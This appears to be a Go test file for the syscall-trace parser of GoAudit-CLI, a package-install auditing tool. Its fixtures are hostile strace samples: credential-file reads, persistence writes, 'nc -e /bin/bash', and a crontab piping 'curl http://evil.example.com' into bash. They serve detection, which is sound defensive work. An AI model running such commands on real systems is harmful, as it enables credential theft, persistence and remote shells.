package parser

import (
	"strings"
	"testing"

	"github.com/KushalMeghani1644/GoAudit-CLI/internal/report"
)

func parse(t *testing.T, input string) []report.Finding {
	t.Helper()
	rep := report.NewReporter(true, false)
	findings, err := ParseStream(strings.NewReader(input), rep, ParseOptions{})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	return findings
}

func findByReason(findings []report.Finding, reason string) *report.Finding {
	for i := range findings {
		if findings[i].ReasonCode == reason {
			return &findings[i]
		}
	}
	return nil
}

func TestDetectsCredentialReadAWS(t *testing.T) {
	f := findByReason(parse(t,
		`openat(AT_FDCWD, "/root/.aws/credentials", O_RDONLY) = 3`),
		"CREDENTIAL_READ")
	if f == nil {
		t.Fatal("expected CREDENTIAL_READ for .aws/credentials")
	}
}

func TestDetectsCredentialReadSSH(t *testing.T) {
	f := findByReason(parse(t,
		`openat(AT_FDCWD, "/home/user/.ssh/id_rsa", O_RDONLY) = 3`),
		"CREDENTIAL_READ")
	if f == nil {
		t.Fatal("expected CREDENTIAL_READ for .ssh/id_rsa")
	}
}

func TestDetectsCredentialReadEnv(t *testing.T) {
	f := findByReason(parse(t,
		`openat(AT_FDCWD, "/home/sandbox/.env", O_RDONLY) = 3`),
		"CREDENTIAL_READ")
	if f == nil {
		t.Fatal("expected CREDENTIAL_READ for .env")
	}
}

func TestDetectsCredentialReadRelativeEnv(t *testing.T) {
	f := findByReason(parse(t,
		`openat(AT_FDCWD, ".env", O_RDONLY) = 3`),
		"CREDENTIAL_READ")
	if f == nil {
		t.Fatal("expected CREDENTIAL_READ for relative .env")
	}
}

func TestDetectsCredentialReadOpenat2(t *testing.T) {
	f := findByReason(parse(t,
		`openat2(AT_FDCWD, "/home/sandbox/.kube/config", {flags=O_RDONLY|O_CLOEXEC, resolve=0}, 24) = 3`),
		"CREDENTIAL_READ")
	if f == nil {
		t.Fatal("expected CREDENTIAL_READ for openat2")
	}
}

func TestDetectsPersistenceWriteBashrc(t *testing.T) {
	f := findByReason(parse(t,
		`openat(AT_FDCWD, "/root/.bashrc", O_WRONLY|O_CREAT) = 3`),
		"PERSISTENCE_WRITE")
	if f == nil {
		t.Fatal("expected PERSISTENCE_WRITE for .bashrc")
	}
}

func TestDetectsPersistenceWriteAuthorizedKeys(t *testing.T) {
	f := findByReason(parse(t,
		`openat(AT_FDCWD, "/home/sandbox/.ssh/authorized_keys", O_WRONLY|O_CREAT|O_APPEND|O_CLOEXEC, 0666) = 3`),
		"PERSISTENCE_WRITE")
	if f == nil {
		t.Fatal("expected PERSISTENCE_WRITE for authorized_keys")
	}
}

func TestDetectsPersistenceWriteCron(t *testing.T) {
	f := findByReason(parse(t,
		`openat(AT_FDCWD, "/etc/cron.d/backdoor", O_WRONLY|O_CREAT) = 3`),
		"PERSISTENCE_WRITE")
	if f == nil {
		t.Fatal("expected PERSISTENCE_WRITE for /etc/cron.d/")
	}
}

func TestDetectsPersistenceCrontabExec(t *testing.T) {
	f := findByReason(parse(t,
		`execve("/usr/bin/crontab", ["crontab", "/tmp/.goaudit-cron"], 0x7ffd3f) = 0`),
		"PERSISTENCE_WRITE")
	if f == nil {
		t.Fatal("expected PERSISTENCE_WRITE for crontab execution")
	}
}

func TestAllowedWriteNotFlagged(t *testing.T) {
	findings := parse(t, `openat(AT_FDCWD, "/tmp/npm-cache/file", O_WRONLY|O_CREAT) = 3`)
	for _, f := range findings {
		if f.ReasonCode == "UNEXPECTED_WRITE" || f.ReasonCode == "PERSISTENCE_WRITE" {
			t.Fatalf("should not flag /tmp/ writes, got %s", f.ReasonCode)
		}
	}
}

func TestAllowedWriteNodeModules(t *testing.T) {
	findings := parse(t, `openat(AT_FDCWD, "/workspace/node_modules/lodash/index.js", O_WRONLY|O_CREAT) = 3`)
	for _, f := range findings {
		if f.ReasonCode == "UNEXPECTED_WRITE" {
			t.Fatal("should not flag node_modules writes")
		}
	}
}

func TestUnexpectedWriteFlagged(t *testing.T) {
	f := findByReason(parse(t,
		`openat(AT_FDCWD, "/opt/evil/backdoor.sh", O_WRONLY|O_CREAT) = 3`),
		"UNEXPECTED_WRITE")
	if f == nil {
		t.Fatal("expected UNEXPECTED_WRITE for unusual path")
	}
}

func TestDetectsSuspiciousExecNetcat(t *testing.T) {
	f := findByReason(parse(t,
		`execve("/usr/bin/nc", ["nc", "-e", "/bin/bash"]`),
		"SUSPICIOUS_EXEC")
	if f == nil {
		t.Fatal("expected SUSPICIOUS_EXEC for netcat")
	}
}

func TestDetectsSuspiciousExecFromTmp(t *testing.T) {
	f := findByReason(parse(t,
		`execve("/tmp/payload", ["/tmp/payload"]`),
		"SUSPICIOUS_EXEC")
	if f == nil {
		t.Fatal("expected SUSPICIOUS_EXEC for /tmp/ binary")
	}
}

func TestDetectsPrivilegeEscalation(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\nsetuid(0) = 0"
	f := findByReason(parse(t, input), "PRIVILEGE_ESCALATION")
	if f == nil {
		t.Fatal("expected PRIVILEGE_ESCALATION for setuid(0) after target phase")
	}
}

func TestSetuidBeforeTargetPhaseNotFlagged(t *testing.T) {
	// setuid(0) from su/PAM happens before phase=target and should be ignored.
	for _, f := range parse(t, `setuid(0) = 0`) {
		if f.ReasonCode == "PRIVILEGE_ESCALATION" {
			t.Fatal("should not flag setuid(0) before target phase (su/PAM noise)")
		}
	}
}

func TestSetreuidNoiseNotFlagged(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\nsetreuid(0, -1) = 0"
	for _, f := range parse(t, input) {
		if f.ReasonCode == "PRIVILEGE_ESCALATION" {
			t.Fatal("should not flag setreuid(0,-1) user-switch noise")
		}
	}
}

func TestDetectsSetreuidRootEscalation(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\nsetreuid(0, 0) = 0"
	f := findByReason(parse(t, input), "PRIVILEGE_ESCALATION")
	if f == nil {
		t.Fatal("expected PRIVILEGE_ESCALATION for setreuid(0,0)")
	}
}

func TestNonRootSetuidNotFlagged(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\nsetuid(1000) = 0"
	for _, f := range parse(t, input) {
		if f.ReasonCode == "PRIVILEGE_ESCALATION" {
			t.Fatal("should not flag setuid to non-root")
		}
	}
}

func TestFailedSetuidRootNotFlagged(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\nsetuid(0) = -1 EPERM (Operation not permitted)"
	for _, f := range parse(t, input) {
		if f.ReasonCode == "PRIVILEGE_ESCALATION" {
			t.Fatal("should not flag failed setuid(0)")
		}
	}
}

func TestTargetTimeoutReasonCode(t *testing.T) {
	f := findByReason(parse(t, "GOAUDIT_TARGET_EXIT:124"), "TARGET_COMMAND_TIMEOUT")
	if f == nil {
		t.Fatal("expected TARGET_COMMAND_TIMEOUT for exit 124")
	}
}

func TestDetectsExternalNetwork(t *testing.T) {
	f := findByReason(parse(t,
		`connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("104.16.23.35")}, 16) = 0`),
		"EXTERNAL_NETWORK")
	if f == nil {
		t.Fatal("expected EXTERNAL_NETWORK")
	}
}

func TestLoopbackNotFlagged(t *testing.T) {
	for _, f := range parse(t,
		`connect(3, {sa_family=AF_INET, sin_port=htons(3000), sin_addr=inet_addr("127.0.0.1")}, 16) = 0`) {
		if f.ReasonCode == "EXTERNAL_NETWORK" {
			t.Fatal("should not flag loopback")
		}
	}
}

func TestDetectsInternalNetwork(t *testing.T) {
	f := findByReason(parse(t,
		`connect(3, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr("10.0.0.5")}, 16) = 0`),
		"INTERNAL_NETWORK")
	if f == nil {
		t.Fatal("expected INTERNAL_NETWORK")
	}
}

func TestDetectsCloudMetadataAccess(t *testing.T) {
	f := findByReason(parse(t,
		`connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("169.254.169.254")}, 16) = 0`),
		"CLOUD_METADATA_ACCESS")
	if f == nil {
		t.Fatal("expected CLOUD_METADATA_ACCESS")
	}
}

func TestDetectsSymlinkToCredentials(t *testing.T) {
	f := findByReason(parse(t,
		`symlink("/root/.aws/credentials", "/tmp/link") = 0`),
		"SYMLINK_SENSITIVE_PATH")
	if f == nil {
		t.Fatal("expected SYMLINK_SENSITIVE_PATH")
	}
}

func TestDetectsMemfdCreate(t *testing.T) {
	f := findByReason(parse(t,
		`memfd_create("jit-code", MFD_CLOEXEC) = 3`),
		"FILELESS_EXEC")
	if f == nil {
		t.Fatal("expected FILELESS_EXEC")
	}
}

func TestDetectsPtraceAttach(t *testing.T) {
	f := findByReason(parse(t,
		`ptrace(PTRACE_ATTACH, 1234) = 0`),
		"PROCESS_INJECTION")
	if f == nil {
		t.Fatal("expected PROCESS_INJECTION")
	}
}

func TestDetectsBackdoorListener(t *testing.T) {
	f := findByReason(parse(t,
		`bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0`),
		"BACKDOOR_LISTENER")
	if f == nil {
		t.Fatal("expected BACKDOOR_LISTENER")
	}
}

func TestDetectsChmodOnCriticalPath(t *testing.T) {
	f := findByReason(parse(t,
		`chmod("/usr/local/bin/evil", 0755) = 0`),
		"PERSISTENCE_WRITE")
	if f == nil {
		t.Fatal("expected PERSISTENCE_WRITE for chmod")
	}
}

func TestProbePhaseBoostsConfidence(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=probe\n" +
		`openat(AT_FDCWD, "/root/.aws/credentials", O_RDONLY) = 3`
	findings := parse(t, input)
	f := findByReason(findings, "CREDENTIAL_READ")
	if f == nil {
		t.Fatal("expected CREDENTIAL_READ")
	}
	if !strings.Contains(f.Evidence, "[runtime probe]") {
		t.Fatalf("expected probe annotation, got %q", f.Evidence)
	}
}

func TestInstallPhaseTagsCredentialRead(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		`openat(AT_FDCWD, "/workspace/.env", O_RDONLY) = 3`
	findings := parse(t, input)
	f := findByReason(findings, "CREDENTIAL_READ")
	if f == nil {
		t.Fatal("expected CREDENTIAL_READ for workspace .env")
	}
	if !strings.Contains(f.Evidence, "[install]") {
		t.Fatalf("expected install annotation, got %q", f.Evidence)
	}
}

func TestDetectsGitCredentialsRead(t *testing.T) {
	f := findByReason(parse(t,
		`openat(AT_FDCWD, "/home/node/.git-credentials", O_RDONLY) = 3`),
		"CREDENTIAL_READ")
	if f == nil {
		t.Fatal("expected CREDENTIAL_READ for .git-credentials")
	}
}

func TestDetectsShellWrappedCrontab(t *testing.T) {
	f := findByReason(parse(t,
		`execve("/bin/sh", ["sh", "-c", "echo \"* * * * * curl http://evil.example.com | bash\" | crontab -"], 0x7ffd3f) = 0`),
		"PERSISTENCE_WRITE")
	if f == nil {
		t.Fatal("expected PERSISTENCE_WRITE for shell-wrapped crontab")
	}
}

func TestCredentialReadElevatesNetworkToDataExfil(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		`openat(AT_FDCWD, "/home/node/.ssh/id_rsa", O_RDONLY) = 3` + "\n" +
		`connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("45.33.32.156")}, 16) = 0`
	f := findByReason(parse(t, input), "DATA_EXFIL")
	if f == nil {
		t.Fatal("expected DATA_EXFIL when credentials read precedes outbound network")
	}
	if f.Severity != report.SeverityCritical {
		t.Fatalf("expected critical DATA_EXFIL, got %s", f.Severity)
	}
}

func TestDetectsSendAfterSuspiciousConnect(t *testing.T) {
	input := "GOAUDIT_RUNTIME_META:phase=target\n" +
		`connect(3, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("45.33.32.156")}, 16) = 0` + "\n" +
		`sendto(3, "{\"exfil\":true}", 14, MSG_NOSIGNAL, NULL, 0) = 14`
	f := findByReason(parse(t, input), "DATA_EXFIL")
	if f == nil {
		t.Fatal("expected DATA_EXFIL for sendto after suspicious connect")
	}
}

func TestDetectsIPv6ExternalNetwork(t *testing.T) {
	f := findByReason(parse(t,
		`connect(3, {sa_family=AF_INET6, sin6_port=htons(443), sin6_flowinfo=htonl(0), inet_pton(AF_INET6, "2606:4700::6810:1723"), sin6_scope_id=0}, 28) = 0`),
		"EXTERNAL_NETWORK")
	if f == nil {
		t.Fatal("expected EXTERNAL_NETWORK for IPv6 connection with sin6_port")
	}
}

func TestFailedOpenatNotFlagged(t *testing.T) {
	findings := parse(t,
		`openat(AT_FDCWD, "/root/.ssh/id_ed25519", O_RDONLY) = -1 ENOENT (No such file or directory)`)
	for _, f := range findings {
		if f.ReasonCode == "CREDENTIAL_READ" {
			t.Fatal("should not flag failed openat (ENOENT) as CREDENTIAL_READ")
		}
	}
}

func TestFailedExecveNotFlagged(t *testing.T) {
	findings := parse(t,
		`execve("/tmp/payload", ["/tmp/payload"]) = -1 ENOENT (No such file or directory)`)
	for _, f := range findings {
		if f.ReasonCode == "SUSPICIOUS_EXEC" {
			t.Fatal("should not flag failed execve (ENOENT) as SUSPICIOUS_EXEC")
		}
	}
}

func TestFailedChmodNotFlagged(t *testing.T) {
	findings := parse(t,
		`chmod("/usr/local/bin/evil", 0755) = -1 ENOENT (No such file or directory)`)
	for _, f := range findings {
		if f.ReasonCode == "PERSISTENCE_WRITE" {
			t.Fatal("should not flag failed chmod (ENOENT) as PERSISTENCE_WRITE")
		}
	}
}

func TestSuccessfulOpenatStillFlagged(t *testing.T) {
	// Ensure the failed-syscall filter doesn't suppress successful reads.
	f := findByReason(parse(t,
		`openat(AT_FDCWD, "/root/.ssh/id_ed25519", O_RDONLY) = 3`),
		"CREDENTIAL_READ")
	if f == nil {
		t.Fatal("expected CREDENTIAL_READ for successful openat of .ssh/id_ed25519")
	}
}
